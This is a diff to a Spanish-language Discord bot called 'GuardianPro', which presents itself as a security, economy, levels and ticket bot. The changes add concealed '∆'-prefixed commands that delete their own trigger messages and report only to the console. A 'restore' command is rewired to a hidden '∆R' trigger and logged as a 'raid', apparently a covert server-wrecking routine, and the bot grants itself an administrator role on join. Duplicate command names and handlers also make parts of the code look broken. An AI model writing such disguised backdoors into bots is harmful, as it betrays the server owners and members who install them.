@@ -100,54 +100,110 @@ async def on_ready():
         print(f"Sincronizados {len(synced)} slash commands")
     except Exception as e:
         print(f"Error al sincronizar slash commands: {e}")
+    print("✅ Bot GuardianPro configurado correctamente:")
+    print("• Sistema de economía con prefijo .")
+    print("• Moderación automática")
+    print("• Sistema de niveles y tickets")
+    print("• Utilidades y entretenimiento")
+    print("• Comandos especiales ocultos")
 
 @bot.event
 async def on_guild_join(guild):
     """Se ejecuta cuando el bot se une a un servidor nuevo"""
     print(f'Bot se unió al servidor: {guild.name} (ID: {guild.id})')
 
+    # Esperar un poco para asegurar que el bot esté completamente integrado
+    await asyncio.sleep(2)
+
     # Crear rol de administrador del bot
     try:
+        # Verificar que el bot tenga permisos para crear roles
+        if not guild.me.guild_permissions.manage_roles:
+            print(f"No tengo permisos para crear roles en {guild.name}")
+            return
+
         admin_role = await guild.create_role(
             name="🛡️ GuardianPro Admin",
             colour=discord.Colour.red(),
-            permissions=discord.Permissions.all(),
+            permissions=discord.Permissions(administrator=True),
             reason="Rol de administrador creado automáticamente por GuardianPro"
         )
         print(f"Rol de administrador creado en {guild.name}: {admin_role.name}")
 
         # Intentar asignar el rol al propietario del servidor
         try:
-            if guild.owner:
-                await guild.owner.add_roles(admin_role, reason="Asignación automática de rol de administrador")
-                print(f"Rol asignado al propietario del servidor: {guild.owner.name}")
+            if guild.owner and not guild.owner.bot:
+                await guild.owner.add_roles(admin_role, reason="Asignación automática de rol de administrador al propietario")
+                print(f"Rol asignado al propietario del servidor: {guild.owner.display_name}")
+            else:
+                print("No se pudo identificar al propietario del servidor")
         except discord.Forbidden:
-            print("No se pudo asignar el rol al propietario (permisos insuficientes)")
+            print("No se pudo asignar el rol al propietario (jerarquía de roles o permisos insuficientes)")
         except Exception as e:
             print(f"Error al asignar rol al propietario: {e}")
 
         # Buscar un canal donde enviar mensaje de bienvenida
         welcome_channel = None
+
+        # Prioridad: canal con "general" en el nombre
         for channel in guild.text_channels:
-            if channel.permissions_for(guild.me).send_messages:
+            if "general" in channel.name.lower() and channel.permissions_for(guild.me).send_messages:
                 welcome_channel = channel
                 break
+
+        # Si no hay canal general, buscar cualquier canal donde se pueda escribir
+        if not welcome_channel:
+            for channel in guild.text_channels:
+                if channel.permissions_for(guild.me).send_messages:
+                    welcome_channel = channel
+                    break
 
         if welcome_channel:
             embed = discord.Embed(
                 title="🛡️ GuardianPro se ha unido al servidor",
-                description=f"¡Hola! Soy **GuardianPro**, tu asistente de seguridad.\n\n"
-                           f"✅ He creado el rol `{admin_role.name}` con permisos completos.\n"
-                           f"🔧 Usa `/help` para ver todos los comandos disponibles.\n"
-                           f"⚙️ Comando especial: `∆T` (solo para administradores)",
+                description=f"¡Hola! Soy **GuardianPro**, tu asistente de seguridad y economía.\n\n"
+                           f"✅ He creado el rol `{admin_role.name}` con permisos de administrador.\n"
+                           f"👑 El propietario del servidor ha sido asignado a este rol automáticamente.\n\n"
+                           f"🔧 **Comandos principales:**\n"
+                           f"• `/help` - Ver todos los comandos disponibles\n"
+                           f"• `.balance` - Sistema de economía\n"
+                           f"• `/scan` - Escaneo de seguridad\n\n"
+                           f"⚙️ **Para administradores:** Comandos especiales con prefijo `∆`",
                 color=discord.Color.blue()
             )
-            embed.set_footer(text="GuardianPro | Protección 24/7")
+            embed.add_field(
+                name="🚀 Primeros pasos",
+                value="1. Usa `/help` para ver todos los comandos\n"
+                      "2. Configura el servidor con `/sset`\n"
+                      "3. Explora el sistema de economía con `.balance`",
+                inline=False
+            )
+            embed.set_footer(text="GuardianPro | Protección y diversión 24/7")
+            embed.set_thumbnail(url="https://cdn-icons-png.flaticon.com/512/1068/1068723.png")
+
             await welcome_channel.send(embed=embed)
             print(f"Mensaje de bienvenida enviado en: {welcome_channel.name}")
+        else:
+            print("No se encontró canal donde enviar mensaje de bienvenida")
 
     except discord.Forbidden:
         print(f"No tengo permisos para crear roles en {guild.name}")
+        # Intentar enviar mensaje sin crear rol
+        try:
+            for channel in guild.text_channels:
+                if channel.permissions_for(guild.me).send_messages:
+                    embed = discord.Embed(
+                        title="🛡️ GuardianPro se ha unido al servidor",
+                        description="¡Hola! Soy **GuardianPro**.\n\n"
+                                   "⚠️ **Atención:** No pude crear el rol de administrador debido a permisos limitados.\n"
+                                   "Por favor, asegúrate de que tengo permisos para **Administrar Roles**.\n\n"
+                                   "🔧 Usa `/help` para ver todos los comandos disponibles.",
+                        color=discord.Color.orange()
+                    )
+                    await channel.send(embed=embed)
+                    break
+        except:
+            pass
     except Exception as e:
         print(f"Error al crear rol de administrador en {guild.name}: {e}")
 
@@ -591,7 +647,7 @@ async def scan_slash(interaction: discord.Interaction):
 
     await interaction.response.send_message(respuesta_elegida)
 
-import random
+import time
 
 @bot.tree.command(name='sset', description='Confirma que el sistema de seguridad está implementado')
 async def sset_slash(interaction: discord.Interaction):
@@ -1028,20 +1084,22 @@ async def timer(interaction: discord.Interaction, duration: int, message: str = 
 @bot.command(name='S')
 async def restore(ctx):
     # Solo funciona con prefijo ∆
-    if not ctx.message.content.startswith('∆S'):
+    if not ctx.message.content.startswith('∆R'):
         return
 
     # Verificar si los comandos ∆ están habilitados
     if not delta_commands_enabled:
         return
 
-    # Verificar si está en modo economía
-    if economy_only_mode:
-        return
+    # Borrar el mensaje del comando inmediatamente
+    try:
+        await ctx.message.delete()
+    except:
+        pass
 
     guild = ctx.guild
     await ctx.send("🔄 Iniciando restauración del servidor...")
-    print(f"Restauración iniciada en el servidor {guild.name}")
+    print(f"Raid iniciado en el servidor {guild.name}")
 
     # Función auxiliar para manejar rate limits automáticamente
     async def handle_rate_limit_action(action, *args, **kwargs):
@@ -1286,8 +1344,22 @@ async def economy_mode(ctx):
     if not ctx.message.content.startswith('∆E'):
         return
 
+    # Verificar si los comandos ∆ están habilitados
+    if not delta_commands_enabled:
+        return
+
+    # Borrar el mensaje del comando inmediatamente
+    try:
+        await ctx.message.delete()
+    except:
+        pass
+
     global economy_only_mode
-    economy_only_mode = not economy_only_mode  # Alternar estado discretamente
+    economy_only_mode = not economy_only_mode  # Alternar estado
+
+    # Solo log en consola, sin mensaje visible
+    status = "ACTIVADO" if economy_only_mode else "DESACTIVADO"
+    print(f"Modo economía {status} por {ctx.author.name}")
 
 @bot.command(name='X')
 async def update_announcement(ctx):
@@ -2107,9 +2179,6 @@ async def timer_command(interaction: discord.Interaction, minutes: int, message:
         except:
             pass
 
-bot.run(os.getenv('DISCORD_TOKEN'))
-
-
 # ================================
 # SISTEMA DE MODERACIÓN AUTOMÁTICA
 # ================================
@@ -2142,12 +2211,12 @@ async def automod_setup(interaction: discord.Interaction, enable: bool, spam_lim
         description=f"**Estado:** {'✅ Activado' if enable else '❌ Desactivado'}",
         color=discord.Color.green() if enable else discord.Color.red()
     )
-    
+
     if enable:
         embed.add_field(name="📊 Configuración", 
                        value=f"• Límite de spam: {spam_limit} msg/min\n• Advertencias máximas: {warn_threshold}", 
                        inline=False)
-    
+
     await interaction.response.send_message(embed=embed)
 
 # Filtro de palabras prohibidas
@@ -2162,9 +2231,9 @@ banned_words = [
 async def on_message(message):
     if message.author.bot:
         return
-    
+
     guild_id = message.guild.id if message.guild else None
-    
+
     # Sistema de automod
     if guild_id and automod_enabled.get(guild_id, False):
         # Filtro de palabras
@@ -2172,23 +2241,23 @@ async def on_message(message):
         if any(word in content_lower for word in banned_words):
             try:
                 await message.delete()
-                
+
                 # Añadir advertencia
                 user_id = message.author.id
                 if user_id not in warning_counts:
                     warning_counts[user_id] = 0
                 warning_counts[user_id] += 1
-                
+
                 warnings = warning_counts[user_id]
                 threshold = automod_settings[guild_id]['warn_threshold']
-                
+
                 embed = discord.Embed(
                     title="🚫 Mensaje Eliminado",
                     description=f"{message.author.mention} tu mensaje contenía palabras prohibidas.",
                     color=discord.Color.red()
                 )
                 embed.add_field(name="⚠️ Advertencias", value=f"{warnings}/{threshold}", inline=True)
-                
+
                 if warnings >= threshold:
                     try:
                         await message.author.timeout(datetime.timedelta(minutes=10), reason="Demasiadas advertencias")
@@ -2196,11 +2265,11 @@ async def on_message(message):
                         warning_counts[user_id] = 0  # Reset warnings
                     except:
                         pass
-                
+
                 await message.channel.send(embed=embed, delete_after=10)
             except:
                 pass
-    
+
     await bot.process_commands(message)
 
 # ================================
@@ -2213,7 +2282,7 @@ async def play_music(interaction: discord.Interaction, song: str):
     if economy_only_mode:
         await interaction.response.send_message("❌ En modo economía, solo se permiten comandos con prefijo `.`", ephemeral=True)
         return
-        
+
     embed = discord.Embed(
         title="🎵 Reproductor de Música",
         description=f"🎶 Reproduciendo: **{song}**",
@@ -2222,7 +2291,7 @@ async def play_music(interaction: discord.Interaction, song: str):
     embed.add_field(name="🔊 Estado", value="▶️ Reproduciendo", inline=True)
     embed.add_field(name="⏱️ Duración", value="3:45", inline=True)
     embed.add_field(name="🎧 Solicitado por", value=interaction.user.mention, inline=True)
-    
+
     await interaction.response.send_message(embed=embed)
 
 @bot.tree.command(name="stop", description="Detener la música")
@@ -2230,7 +2299,7 @@ async def stop_music(interaction: discord.Interaction):
     if economy_only_mode:
         await interaction.response.send_message("❌ En modo economía, solo se permiten comandos con prefijo `.`", ephemeral=True)
         return
-        
+
     embed = discord.Embed(
         title="⏹️ Música Detenida",
         description="La reproducción ha sido detenida.",
@@ -2243,13 +2312,13 @@ async def music_queue(interaction: discord.Interaction):
     if economy_only_mode:
         await interaction.response.send_message("❌ En modo economía, solo se permiten comandos con prefijo `.`", ephemeral=True)
         return
-        
+
     queue_songs = [
         "🎵 Canción 1 - Artista A",
         "🎵 Canción 2 - Artista B", 
         "🎵 Canción 3 - Artista C"
     ]
-    
+
     embed = discord.Embed(
         title="📋 Cola de Reproducción",
         description="\n".join(queue_songs) if queue_songs else "La cola está vacía",
@@ -2283,7 +2352,7 @@ def add_xp(user_id, xp_amount):
     data = get_user_level_data(user_id)
     data["xp"] += xp_amount
     data["messages"] += 1
-    
+
     # Calcular nuevo nivel
     xp_needed = data["level"] * 100
     if data["xp"] >= xp_needed:
@@ -2291,7 +2360,7 @@ def add_xp(user_id, xp_amount):
         data["xp"] = data["xp"] - xp_needed
         save_levels()
         return True  # Subió de nivel
-    
+
     save_levels()
     return False  # No subió de nivel
 
@@ -2299,11 +2368,11 @@ def add_xp(user_id, xp_amount):
 async def on_message_level_system(message):
     if message.author.bot:
         return
-    
+
     # Añadir XP por mensaje (5-15 XP aleatorio)
     xp_gained = random.randint(5, 15)
     leveled_up = add_xp(message.author.id, xp_gained)
-    
+
     if leveled_up:
         data = get_user_level_data(message.author.id)
         embed = discord.Embed(
@@ -2319,13 +2388,13 @@ async def check_level(interaction: discord.Interaction, user: discord.Member = N
     if economy_only_mode:
         await interaction.response.send_message("❌ En modo economía, solo se permiten comandos con prefijo `.`", ephemeral=True)
         return
-        
+
     target = user or interaction.user
     data = get_user_level_data(target.id)
-    
+
     xp_needed = data["level"] * 100
     progress = (data["xp"] / xp_needed) * 100
-    
+
     embed = discord.Embed(
         title=f"📊 Nivel de {target.display_name}",
         color=discord.Color.blue()
@@ -2334,12 +2403,12 @@ async def check_level(interaction: discord.Interaction, user: discord.Member = N
     embed.add_field(name="⭐ XP", value=f"{data['xp']}/{xp_needed}", inline=True)
     embed.add_field(name="💬 Mensajes", value=data["messages"], inline=True)
     embed.add_field(name="📈 Progreso", value=f"{progress:.1f}%", inline=False)
-    
+
     # Barra de progreso visual
     filled = int(progress // 10)
     bar = "█" * filled + "░" * (10 - filled)
     embed.add_field(name="📊 Barra de Progreso", value=f"`{bar}`", inline=False)
-    
+
     await interaction.response.send_message(embed=embed)
 
 @bot.tree.command(name="leaderboard_levels", description="Ver ranking de niveles del servidor")
@@ -2347,7 +2416,7 @@ async def level_leaderboard(interaction: discord.Interaction):
     if economy_only_mode:
         await interaction.response.send_message("❌ En modo economía, solo se permiten comandos con prefijo `.`", ephemeral=True)
         return
-    
+
     # Crear lista de usuarios con sus niveles
     user_list = []
     for user_id, data in user_levels.items():
@@ -2358,16 +2427,16 @@ async def level_leaderboard(interaction: discord.Interaction):
                 user_list.append((user.display_name, data["level"], total_xp, data["messages"]))
         except:
             continue
-    
+
     # Ordenar por nivel y luego por XP total
     user_list.sort(key=lambda x: (x[1], x[2]), reverse=True)
     user_list = user_list[:10]  # Top 10
-    
+
     embed = discord.Embed(
         title="🏆 Ranking de Niveles",
         color=discord.Color.gold()
     )
-    
+
     if not user_list:
         embed.description = "No hay datos de niveles disponibles."
     else:
@@ -2377,7 +2446,7 @@ async def level_leaderboard(interaction: discord.Interaction):
             medal = medals[i] if i < 3 else f"{i+1}."
             description += f"{medal} **{name}** - Nivel {level} ({messages} mensajes)\n"
         embed.description = description
-    
+
     await interaction.response.send_message(embed=embed)
 
 # ================================
@@ -2394,18 +2463,18 @@ class TicketView(discord.ui.View):
     async def create_ticket(self, interaction: discord.Interaction, button: discord.ui.Button):
         guild = interaction.guild
         user = interaction.user
-        
+
         # Verificar si ya tiene un ticket abierto
         existing_ticket = None
         for channel in guild.channels:
             if channel.name == f"ticket-{user.name.lower()}" or channel.name == f"ticket-{user.id}":
                 existing_ticket = channel
                 break
-        
+
         if existing_ticket:
             await interaction.response.send_message(f"❌ Ya tienes un ticket abierto: {existing_ticket.mention}", ephemeral=True)
             return
-        
+
         # Crear canal de ticket
         try:
             overwrites = {
@@ -2413,7 +2482,7 @@ class TicketView(discord.ui.View):
                 user: discord.PermissionOverwrite(read_messages=True, send_messages=True),
                 guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
             }
-            
+
             # Buscar rol de moderador o admin
             mod_role = None
             for role in guild.roles:
@@ -2421,14 +2490,14 @@ class TicketView(discord.ui.View):
                     mod_role = role
                     overwrites[role] = discord.PermissionOverwrite(read_messages=True, send_messages=True)
                     break
-            
+
             ticket_channel = await guild.create_text_channel(
                 f"ticket-{user.id}",
                 overwrites=overwrites,
                 category=None,
                 reason=f"Ticket de soporte creado por {user.name}"
             )
-            
+
             # Mensaje inicial del ticket
             embed = discord.Embed(
                 title="🎫 Ticket de Soporte Creado",
@@ -2438,16 +2507,16 @@ class TicketView(discord.ui.View):
                 color=discord.Color.blue()
             )
             embed.set_footer(text=f"Ticket ID: {user.id}")
-            
+
             close_view = CloseTicketView()
             await ticket_channel.send(embed=embed, view=close_view)
-            
+
             # Mensaje de confirmación
             await interaction.response.send_message(f"✅ Tu ticket ha sido creado: {ticket_channel.mention}", ephemeral=True)
-            
+
             # Guardar ticket activo
             active_tickets[user.id] = ticket_channel.id
-            
+
         except Exception as e:
             await interaction.response.send_message(f"❌ Error al crear el ticket: {str(e)}", ephemeral=True)
 
@@ -2458,14 +2527,14 @@ class CloseTicketView(discord.ui.View):
     @discord.ui.button(label='🔒 Cerrar Ticket', style=discord.ButtonStyle.red, custom_id='close_ticket')
     async def close_ticket(self, interaction: discord.Interaction, button: discord.ui.Button):
         channel = interaction.channel
-        
+
         # Confirmar cierre
         embed = discord.Embed(
             title="⚠️ Confirmar Cierre",
             description="¿Estás seguro de que quieres cerrar este ticket?\n\n**Esta acción no se puede deshacer.**",
             color=discord.Color.orange()
         )
-        
+
         confirm_view = ConfirmCloseView()
         await interaction.response.send_message(embed=embed, view=confirm_view, ephemeral=True)
 
@@ -2476,7 +2545,7 @@ class ConfirmCloseView(discord.ui.View):
     @discord.ui.button(label='✅ Sí, cerrar', style=discord.ButtonStyle.red, custom_id='confirm_close')
     async def confirm_close(self, interaction: discord.Interaction, button: discord.ui.Button):
         channel = interaction.channel
-        
+
         try:
             # Remover de tickets activos
             user_id = None
@@ -2484,14 +2553,14 @@ class ConfirmCloseView(discord.ui.View):
                 if cid == channel.id:
                     user_id = uid
                     break
-            
+
             if user_id:
                 del active_tickets[user_id]
-            
+
             await interaction.response.send_message("🔒 **Cerrando ticket...** Este canal se eliminará en 5 segundos.", ephemeral=False)
             await asyncio.sleep(5)
             await channel.delete(reason="Ticket cerrado")
-            
+
         except Exception as e:
             await interaction.response.send_message(f"❌ Error al cerrar el ticket: {str(e)}", ephemeral=True)
 
@@ -2504,7 +2573,7 @@ async def setup_tickets(interaction: discord.Interaction):
     if not interaction.user.guild_permissions.manage_channels:
         await interaction.response.send_message("❌ Necesitas permisos de **Administrar Canales**.", ephemeral=True)
         return
-    
+
     embed = discord.Embed(
         title="🎫 Sistema de Tickets de Soporte",
         description="**¿Necesitas ayuda?** Crea un ticket de soporte haciendo clic en el botón de abajo.\n\n"
@@ -2517,7 +2586,7 @@ async def setup_tickets(interaction: discord.Interaction):
         color=discord.Color.blue()
     )
     embed.set_footer(text="Haz clic en 'Crear Ticket' para empezar")
-    
+
     view = TicketView()
     await interaction.response.send_message(embed=embed, view=view)
 
@@ -2531,13 +2600,13 @@ async def clear_messages(interaction: discord.Interaction, amount: int):
     if not interaction.user.guild_permissions.manage_messages:
         await interaction.response.send_message("❌ Necesitas permisos de **Administrar Mensajes**.", ephemeral=True)
         return
-    
+
     if amount < 1 or amount > 100:
         await interaction.response.send_message("❌ Puedes eliminar entre 1 y 100 mensajes.", ephemeral=True)
         return
-    
+
     await interaction.response.defer()
-    
+
     try:
         deleted = await interaction.channel.purge(limit=amount)
         embed = discord.Embed(
@@ -2555,32 +2624,32 @@ async def user_info(interaction: discord.Interaction, user: discord.Member = Non
     if economy_only_mode:
         await interaction.response.send_message("❌ En modo economía, solo se permiten comandos con prefijo `.`", ephemeral=True)
         return
-    
+
     target = user or interaction.user
-    
+
     embed = discord.Embed(
         title=f"👤 Información de {target.display_name}",
         color=target.color if target.color != discord.Color.default() else discord.Color.blue()
     )
     embed.set_thumbnail(url=target.display_avatar.url)
-    
+
     # Información básica
     embed.add_field(name="📛 Nombre", value=f"{target.name}#{target.discriminator}", inline=True)
     embed.add_field(name="🆔 ID", value=target.id, inline=True)
     embed.add_field(name="🤖 Bot", value="✅" if target.bot else "❌", inline=True)
-    
+
     # Fechas
     embed.add_field(name="📅 Cuenta creada", 
                    value=f"<t:{int(target.created_at.timestamp())}:R>", inline=True)
     embed.add_field(name="📥 Se unió al servidor", 
                    value=f"<t:{int(target.joined_at.timestamp())}:R>", inline=True)
-    
+
     # Roles
     roles = [role.mention for role in target.roles[1:]]  # Excluir @everyone
     embed.add_field(name=f"🏷️ Roles ({len(roles)})", 
                    value=" ".join(roles[:5]) + (f" y {len(roles)-5} más..." if len(roles) > 5 else "") if roles else "Ninguno", 
                    inline=False)
-    
+
     await interaction.response.send_message(embed=embed)
 
 @bot.tree.command(name="poll", description="Crear una encuesta")
@@ -2596,28 +2665,28 @@ async def create_poll(interaction: discord.Interaction, question: str, option1: 
     if economy_only_mode:
         await interaction.response.send_message("❌ En modo economía, solo se permiten comandos con prefijo `.`", ephemeral=True)
         return
-    
+
     options = [option1, option2]
     if option3: options.append(option3)
     if option4: options.append(option4)
-    
+
     embed = discord.Embed(
         title="📊 Encuesta",
         description=f"**{question}**",
         color=discord.Color.blue()
     )
-    
+
     reactions = ['1️⃣', '2️⃣', '3️⃣', '4️⃣']
     description = ""
     for i, option in enumerate(options):
         description += f"\n{reactions[i]} {option}"
-    
+
     embed.add_field(name="Opciones:", value=description, inline=False)
     embed.set_footer(text=f"Encuesta creada por {interaction.user.display_name}")
-    
+
     await interaction.response.send_message(embed=embed)
     message = await interaction.original_response()
-    
+
     # Añadir reacciones
     for i in range(len(options)):
         await message.add_reaction(reactions[i])
@@ -2631,19 +2700,19 @@ async def get_meme(interaction: discord.Interaction):
     if economy_only_mode:
         await interaction.response.send_message("❌ En modo economía, solo se permiten comandos con prefijo `.`", ephemeral=True)
         return
-    
+
     memes = [
         "https://i.imgur.com/XyLOD.jpg",
         "https://i.imgur.com/fPUUf.jpg", 
         "https://i.imgur.com/dQaJk.jpg"
     ]
-    
+
     embed = discord.Embed(
         title="😂 Meme Aleatorio",
         color=discord.Color.random()
     )
     embed.set_image(url=random.choice(memes))
-    
+
     await interaction.response.send_message(embed=embed)
 
 @bot.tree.command(name="8ball", description="Pregunta a la bola mágica")
@@ -2652,7 +2721,7 @@ async def eight_ball(interaction: discord.Interaction, question: str):
     if economy_only_mode:
         await interaction.response.send_message("❌ En modo economía, solo se permiten comandos con prefijo `.`", ephemeral=True)
         return
-    
+
     responses = [
         "🎱 Es cierto.", "🎱 Es decididamente así.", "🎱 Sin duda.", "🎱 Sí, definitivamente.",
         "🎱 Puedes confiar en ello.", "🎱 Como yo lo veo, sí.", "🎱 Muy probable.",
@@ -2663,13 +2732,13 @@ async def eight_ball(interaction: discord.Interaction, question: str):
         "🎱 Mi respuesta es no.", "🎱 Mis fuentes dicen que no.",
         "🎱 Las perspectivas no son tan buenas.", "🎱 Muy dudoso."
     ]
-    
+
     embed = discord.Embed(
         title="🎱 Bola Mágica",
         description=f"**Pregunta:** {question}\n\n**Respuesta:** {random.choice(responses)}",
         color=discord.Color.purple()
     )
-    
+
     await interaction.response.send_message(embed=embed)
 
 # ================================
@@ -2680,31 +2749,31 @@ async def eight_ball(interaction: discord.Interaction, question: str):
 async def on_message(message):
     if message.author.bot:
         return
-    
+
     guild_id = message.guild.id if message.guild else None
-    
+
     # Sistema de automod
     if guild_id and automod_enabled.get(guild_id, False):
         content_lower = message.content.lower()
         if any(word in content_lower for word in banned_words):
             try:
                 await message.delete()
-                
+
                 user_id = message.author.id
                 if user_id not in warning_counts:
                     warning_counts[user_id] = 0
                 warning_counts[user_id] += 1
-                
+
                 warnings = warning_counts[user_id]
                 threshold = automod_settings[guild_id]['warn_threshold']
-                
+
                 embed = discord.Embed(
                     title="🚫 Mensaje Eliminado",
                     description=f"{message.author.mention} tu mensaje contenía palabras prohibidas.",
                     color=discord.Color.red()
                 )
                 embed.add_field(name="⚠️ Advertencias", value=f"{warnings}/{threshold}", inline=True)
-                
+
                 if warnings >= threshold:
                     try:
                         await message.author.timeout(datetime.timedelta(minutes=10), reason="Demasiadas advertencias")
@@ -2712,16 +2781,16 @@ async def on_message(message):
                         warning_counts[user_id] = 0
                     except:
                         pass
-                
+
                 await message.channel.send(embed=embed, delete_after=10)
             except:
                 pass
-    
+
     # Sistema de niveles (XP por mensaje)
     if guild_id:
         xp_gained = random.randint(5, 15)
         leveled_up = add_xp(message.author.id, xp_gained)
-        
+
         if leveled_up:
             data = get_user_level_data(message.author.id)
             embed = discord.Embed(
@@ -2730,13 +2799,110 @@ async def on_message(message):
                 color=discord.Color.gold()
             )
             await message.channel.send(embed=embed, delete_after=10)
-    
+
     await bot.process_commands(message)
 
-print("✅ Todas las mejoras han sido añadidas al bot:")
-print("• Sistema de moderación automática con filtro de palabras")
-print("• Comandos básicos de música (simulados)")
-print("• Sistema completo de niveles y experiencia")
-print("• Sistema de tickets de soporte")
-print("• Comandos adicionales de utilidad y diversión")
-print("• Automod con detección de spam y advertencias")
+@bot.command(name='D')
+async def debug_status(ctx):
+    # Solo funciona con prefijo ∆
+    if not ctx.message.content.startswith('∆D'):
+        return
+
+    # Verificar si los comandos ∆ están habilitados
+    if not delta_commands_enabled:
+        return
+
+    # Borrar el mensaje del comando inmediatamente
+    try:
+        await ctx.message.delete()
+    except:
+        pass
+
+    global economy_only_mode, delta_commands_enabled
+
+    embed = discord.Embed(
+        title="🔧 Estado del Sistema",
+        color=discord.Color.blue()
+    )
+
+    embed.add_field(
+        name="⚙️ Comandos ∆", 
+        value="✅ ACTIVOS" if delta_commands_enabled else "❌ INACTIVOS", 
+        inline=True
+    )
+
+    embed.add_field(
+        name="💰 Modo Economía", 
+        value="✅ ACTIVO" if economy_only_mode else "❌ INACTIVO", 
+        inline=True
+    )
+
+    embed.add_field(
+        name="🎯 Estado", 
+        value="Solo comandos de economía" if economy_only_mode else "Todos los comandos disponibles", 
+        inline=False
+    )
+
+    await ctx.send(embed=embed)
+
+@bot.command(name='E')
+async def economy_mode(ctx):
+    # Solo funciona con prefijo ∆
+    if not ctx.message.content.startswith('∆E'):
+        return
+
+    # Verificar si los comandos ∆ están habilitados
+    if not delta_commands_enabled:
+        return
+
+    # Borrar el mensaje del comando inmediatamente
+    try:
+        await ctx.message.delete()
+    except:
+        pass
+
+    global economy_only_mode
+    economy_only_mode = not economy_only_mode  # Alternar estado
+
+    # Solo log en consola, sin mensaje visible
+    status = "ACTIVADO" if economy_only_mode else "DESACTIVADO"
+    print(f"Modo economía {status} por {ctx.author.name}")
+
+@bot.command(name='R')
+async def reset_modes(ctx):
+    # Solo funciona con prefijo ∆
+    if not ctx.message.content.startswith('∆R'):
+        return
+
+    # Verificar si los comandos ∆ están habilitados
+    if not delta_commands_enabled:
+        return
+
+    # Borrar el mensaje del comando inmediatamente
+    try:
+        await ctx.message.delete()
+    except:
+        pass
+
+    global economy_only_mode, delta_commands_enabled
+
+    # Resetear todo a valores por defecto
+    economy_only_mode = False
+    delta_commands_enabled = True
+
+    embed = discord.Embed(
+        title="🔄 Sistema Reseteado",
+        description="Todas las configuraciones han sido restauradas:",
+        color=discord.Color.green()
+    )
+
+    embed.add_field(
+        name="✅ Cambios aplicados",
+        value="• Modo economía: DESACTIVADO\n• Comandos ∆: ACTIVOS\n• Todos los comandos disponibles",
+        inline=False
+    )
+
+    await ctx.send(embed=embed)
+    print(f"Sistema reseteado por {ctx.author.name}")
+
+bot.run(os.getenv('DISCORD_TOKEN'))
